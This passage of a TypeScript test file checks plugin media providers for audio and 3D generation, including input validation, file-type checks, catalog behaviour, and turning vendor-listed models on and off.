    const voice = (await media.audioProviders())[0]!.models[0]!;
    await expect(media.generateAudio(voice, { prompt: "Hello" }, undefined, await journalAt("audio-1"))).rejects.toThrow("answered 503");
    const again = await media.generateAudio(voice, { prompt: "Hello" }, undefined, await journalAt("audio-1"));
    expect(again.mediaType).toBe("audio/wav");
    expect(requests.filter((request) => request.url === "https://api.flow.example/v1/audio")).toHaveLength(1);
  }, 15_000);

  it("refuses a request without a prompt, and a length below a model's minimum", async () => {
    const minimumOnly = { audio: { models: [{ id: "long", kinds: ["music"], formats: ["wav"], minDurationSeconds: 10 }] } } as unknown as Partial<Media>;
    const { media, requests } = await setup(AUDIO_START, { media: minimumOnly });
    const audio = new ProviderAudio(async () => media.audioAdapters(() => true));
    await expect(audio.generate({ prompt: "   " })).rejects.toThrow("needs a prompt");
    await expect(audio.generate({ prompt: "a march", durationSeconds: 2 })).rejects.toThrow("10 to any number of seconds");
    expect(requests).toEqual([]);
  }, 15_000);

  it("refuses a file that isn't the audio asked for", async () => {
    const { media } = await setup(AUDIO_START, { media: AUDIO_MEDIA, reply: (url) => url.endsWith(".wav") ? new Response(new Uint8Array(PNG)) : undefined });
    const voice = (await media.audioProviders())[0]!.models[0]!;
    await expect(media.generateAudio(voice, { prompt: "Hello", output: { format: "wav" } })).rejects.toThrow("Invalid wav audio");
    await expect(media.generateAudio(voice, { prompt: "Hello" })).rejects.toThrow("Flow returned a file that isn't playable audio");
  }, 15_000);

  it("keeps the audio a model made when no format was picked, as some vendors don't say which", async () => {
    const mp3Only = { audio: { models: [{ ...(AUDIO_MEDIA.audio!.models[1]!), formats: ["mp3"] }] } } as unknown as Partial<Media>;
    const { media } = await setup(AUDIO_START, { media: mp3Only, reply: (url) => url.endsWith(".wav") ? new Response(new Uint8Array(WAV)) : undefined });
    const foley = (await media.audioProviders())[0]!.models[0]!;
    expect((await media.generateAudio(foley, { prompt: "rain" })).mediaType).toBe("audio/wav");
    await expect(media.generateAudio(foley, { prompt: "rain", output: { format: "mp3" } })).rejects.toThrow("Invalid mp3 audio");
  }, 15_000);

  it("joins the audio catalog, which picks its model by kind", async () => {
    const { media } = await setup(AUDIO_START, { media: AUDIO_MEDIA, reply: (url) => url.endsWith(".wav") ? new Response(new Uint8Array(WAV)) : undefined });
    const enabled = new Set(["plugin.acme.flow.flow"]);
    const audio = new ProviderAudio(async () => media.audioAdapters((id) => enabled.has(id)));
    const catalog = await audio.catalog();
    expect(catalog.models.map((model) => model.id)).toEqual(["voice", "foley"]);
    expect(catalog.providers).toEqual([{ provider: "plugin.acme.flow.flow", name: "Flow", defaultVoiceId: "amy", listsVoices: true, configured: true, state: "ready" }]);
    expect(await audio.voices("plugin.acme.flow.flow", {})).toEqual({ voices: [{ id: "amy", name: "Amy" }, { id: "bo", name: "Bo" }] });
    expect((await audio.generate({ prompt: "rain", kind: "sound-effect" })).model).toEqual({ provider: "plugin.acme.flow.flow", id: "foley" });
    // Switched off in Settings, it leaves the catalog.
    enabled.clear();
    expect((await audio.catalog()).providers[0]!.state).toBe("disabled");
    await expect(audio.generate({ prompt: "Hi" })).rejects.toThrow("No audio model is available");
  }, 15_000);
});

const MODEL3D_MEDIA = { "3d": { models: [
  { id: "mesh", title: "Mesh", operations: ["text", "image"], maxReferenceImages: 2, polycount: { min: 1000, max: 50000, default: 10000 }, texture: true },
] } } as unknown as Partial<Media>;

// Starts a task and has the model on the first check.
const MODEL3D_TASK = `export default { "3d": {
  async start(input, host) {
    const answer = await (await host.fetch("https://api.flow.example/v1/meshes", { method: "POST", auth: true, json: { ...input, references: input.references.length } })).json();
    return { task: { id: answer.id }, retryAfter: 0 };
  },
  async check(task) { return { outputs: [{ url: "https://cdn.flow.example/" + task.id + ".glb" }] }; },
} };`;

describe("plugin media providers: 3D", () => {
  it("lists a provider's 3D models and makes one from a prompt or pictures through a task", async () => {
    const { media, requests } = await setup(MODEL3D_TASK, { media: MODEL3D_MEDIA, reply: (url) => url.endsWith(".glb") ? new Response(new Uint8Array(GLB)) : undefined });
    const model = (await media.model3DProviders())[0]!.models[0]!;
    expect(model).toEqual({ provider: "plugin.acme.flow.flow", providerName: "Flow", id: "mesh", name: "Mesh", operations: ["text", "image"], maxReferenceImages: 2,
      polycount: { min: 1000, max: 50000, default: 10000, presets: [10000] }, supportsTexture: true, supportsPbr: false, defaults: { texture: true, pbr: false } });
    const ref = { provider: model.provider, id: model.id };
    const made = await media.generate3D(model, { model: ref, operation: "text", prompt: " a chair ", images: [] }, undefined, await journalAt());
    expect(made).toEqual({ bytes: GLB, mediaType: "model/gltf-binary" });
    expect(JSON.parse(requests[0]!.body!)).toEqual({ model: "mesh", operation: "text", prompt: "a chair", references: 0, targetPolycount: 10000, texture: true, pbr: false });
    await (await journalAt()).clear();
    const picture = { mediaType: "image/png" as const, data: PNG.toString("base64") };
    await media.generate3D(model, { model: ref, operation: "image", images: [picture], targetPolycount: 2000, texture: false, pbr: true });
    expect(JSON.parse(requests.at(-2)!.body!)).toEqual({ model: "mesh", operation: "image", references: 1, targetPolycount: 2000, texture: false, pbr: false });
    await expect(media.generate3D(model, { model: ref, operation: "image", images: [picture, picture, picture] })).rejects.toThrow("takes 1 to 2 pictures");
    await expect(media.generate3D(model, { model: ref, operation: "text", prompt: "x", images: [], targetPolycount: 10 })).rejects.toThrow("between 1000 and 50000");
    await expect(media.generate3D(model, { model: ref, operation: "remesh", images: [] })).rejects.toThrow("does not support this operation");
  }, 15_000);

  it("refuses a file that isn't a GLB model", async () => {
    const { media } = await setup(MODEL3D_TASK, { media: MODEL3D_MEDIA, reply: (url) => url.endsWith(".glb") ? new Response(new Uint8Array(PNG)) : undefined });
    const model = (await media.model3DProviders())[0]!.models[0]!;
    await expect(media.generate3D(model, { model: { provider: model.provider, id: model.id }, operation: "text", prompt: "a chair", images: [] })).rejects.toThrow("isn't a GLB model");
  }, 15_000);

  it("joins the 3D catalog and takes requests for its models", async () => {
    const { media } = await setup(MODEL3D_TASK, { media: MODEL3D_MEDIA, reply: (url) => url.endsWith(".glb") ? new Response(new Uint8Array(GLB)) : undefined });
    const models3D = new ProviderModels3D({
      runtime: async () => { throw new Error("no runtime"); },
      meshy: { generator: undefined as never, configured: () => false },
      customProviders: async () => [], nativeModels: () => [], isEnabled: () => true, isVisible: () => true, defaultModel: () => undefined,
      plugins: media,
    });
    const catalog = await models3D.catalog();
    expect(catalog.models.map((model) => `${model.provider}/${model.id}`)).toEqual(["plugin.acme.flow.flow/mesh"]);
    expect(catalog.providers).toEqual([{ provider: "plugin.acme.flow.flow", providerName: "Flow", state: "ready" }]);
    const made = await models3D.generate({ model: { provider: "plugin.acme.flow.flow", id: "mesh" }, operation: "text", prompt: "a chair", images: [] });
    expect(made.mediaType).toBe("model/gltf-binary");
    await expect(models3D.generate({ model: { provider: "plugin.acme.flow.flow", id: "nope" }, operation: "text", prompt: "a chair", images: [] })).rejects.toThrow("unavailable");
  }, 15_000);
});

describe("plugin media providers: listing the vendor's models", () => {
  const LISTING = `export default { image: {
    async models(host) {
      const answer = await (await host.fetch("https://api.flow.example/v1/models", { auth: true })).json();
      return { models: [
        { id: "flux", title: "FLUX", description: "Fast pictures", resolutions: ["1K"], aspectRatios: ["1:1", "16:9"], data: { size: "image_size" } },
        { id: "broken", title: "Broken" },
        { id: "kolors", title: "Kolors again", resolutions: ["1K"], aspectRatios: ["1:1"] },
      ], seen: answer.id };
    },
    async start(input, host) {
      await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true, json: { model: input.model, data: input.modelData ?? null } });
      return { outputs: [{ url: "https://cdn.flow.example/one.png" }] };
    },
  } };`;
  const discovering = { image: { discoverModels: true, models: [{ id: "kolors", title: "Kolors", resolutions: ["1K"], aspectRatios: ["1:1"] }] } } as Partial<Media>;
  const ids = async (media: PluginMediaProviders) => (await media.imageProviders())[0]!.models.map((model) => model.id);

  it("lists the vendor's models through the adapter, which stay off until turned on", async () => {
    const choices = new PluginMediaModelChoices(root);
    const { media, requests } = await setup(LISTING, { media: discovering, choices });
    const provider = "plugin.acme.flow.flow";
    expect(await media.listModels(provider, "image")).toEqual({ kind: "image", discoverable: true, models: [{ id: "kolors", name: "Kolors", default: true, shown: true }] });
    const listed = await media.listModels(provider, "image", true);
    expect(requests[0]).toMatchObject({ url: "https://api.flow.example/v1/models", headers: { authorization: "Bearer sk-test" } });
    expect(listed).toEqual({ kind: "image", discoverable: true, listedAt: expect.any(String), skipped: 1, models: [
      { id: "kolors", name: "Kolors", default: true, shown: true },
      { id: "flux", name: "FLUX", description: "Fast pictures", default: false, shown: false },
    ] });
    expect(await ids(media)).toEqual(["kolors"]);

    await media.setModelsShown(provider, "image", ["flux"], true);
    await media.setModelsShown(provider, "image", ["kolors"], false);
    expect(await ids(media)).toEqual(["flux"]);
    const flux = (await media.imageProviders())[0]!.models[0]!;
    expect(flux.generationOptions).toEqual([{ resolution: "1K", aspectRatio: "1:1" }, { resolution: "1K", aspectRatio: "16:9" }]);
    await media.generateImage(flux, { prompt: "a fox" });
    // The model's data goes back to the adapter.
    expect(JSON.parse(requests.find((request) => request.url.endsWith("/v1/images"))!.body!)).toEqual({ model: "flux", data: { size: "image_size" } });

    // What's on is kept whole, so a restarted app has it without listing again.
    const again = (await setup(LISTING, { media: discovering, choices: new PluginMediaModelChoices(root) })).media;
    expect(await ids(again)).toEqual(["flux"]);
    expect((await again.listModels(provider, "image")).models.map((model) => [model.id, model.shown])).toEqual([["kolors", false], ["flux", true]]);
    // One not listed in this session can't be turned on.
    await expect(again.setModelsShown(provider, "image", ["other"], true)).rejects.toMatchObject({ statusCode: 409 });
    await again.setModelsShown(provider, "image", ["flux"], false);
    await again.setModelsShown(provider, "image", ["kolors"], true);
    expect(await ids(again)).toEqual(["kolors"]);
  }, 15_000);

  it("turns the manifest's models on and off, but lists nothing more, for a kind that doesn't discover", async () => {
    const { media, requests } = await setup(LISTING);
    const provider = "plugin.acme.flow.flow";
    expect(await media.listModels(provider, "image", true)).toEqual({ kind: "image", discoverable: false, models: [expect.objectContaining({ id: "kolors", shown: true })] });
    expect(requests).toEqual([]);
    await media.setModelsShown(provider, "image", ["kolors"], false);
    expect(await ids(media)).toEqual([]);
    await expect(media.listModels(provider, "video")).rejects.toMatchObject({ statusCode: 404 });
  });

  it("says why the adapter couldn't list its models", async () => {
    const { media } = await setup(`export default { image: { async models() { return { error: "no access" }; }, async start() { return { error: "x" }; } } };`, { media: discovering });
    await expect(media.listModels("plugin.acme.flow.flow", "image", true)).rejects.toThrow("Flow couldn't list its models: no access");
  });

  it("never writes over a choices file it can't read", async () => {
    await writeFile(path.join(root, "plugin-media-models.json"), "{ not json");
    const { media } = await setup(LISTING, { media: discovering, choices: new PluginMediaModelChoices(root) });
    expect(await ids(media)).toEqual(["kolors"]);
    await expect(media.setModelsShown("plugin.acme.flow.flow", "image", ["kolors"], false)).rejects.toMatchObject({ statusCode: 409 });
  });
});
